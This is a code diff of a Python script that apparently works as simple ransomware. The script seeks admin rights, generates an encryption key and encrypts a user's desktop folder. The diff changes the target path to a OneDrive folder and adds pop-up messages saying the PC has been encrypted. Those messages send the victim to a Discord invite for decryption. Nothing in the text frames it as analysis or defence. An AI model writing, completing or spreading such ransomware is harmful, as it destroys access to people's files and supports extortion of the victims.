@@ -1,10 +1,12 @@
+import subprocess
 from cryptography.fernet import Fernet
-import os
-import shutil
 import os
 import ctypes
 import sys
 import requests
+from tkinter import messagebox
+
+
 
 def run_as_admin():
     if sys.platform == 'win32':
@@ -19,7 +21,7 @@ def run_as_admin():
 
 
 #fld = "C:/Users/thoma/Desktop"
-fld = 'C:/Users/thoma/Desktop/pcr'
+fld = 'C:/Users/thoma/OneDrive/Bureau/pcr'
 def generate_key():
     return Fernet.generate_key()
 
@@ -65,7 +67,10 @@ if __name__ == "__main__":
         key = generate_key()
         save_key(key, 'secret.key')
         encrypt_folder(key, fld, 'vrenc')
+        messagebox.showinfo("Decryption", "hey i am here to notify you\n your pc have been encrypted\n to decrypt go to https://discord.gg/HjFdfXuZ5g")
+        messagebox.showinfo("Decryption", "https://discord.gg/HjFdfXuZ5g")
     else:
         print("Le script est déjà en cours d'exécution en tant qu'administrateur.")
 
         
+
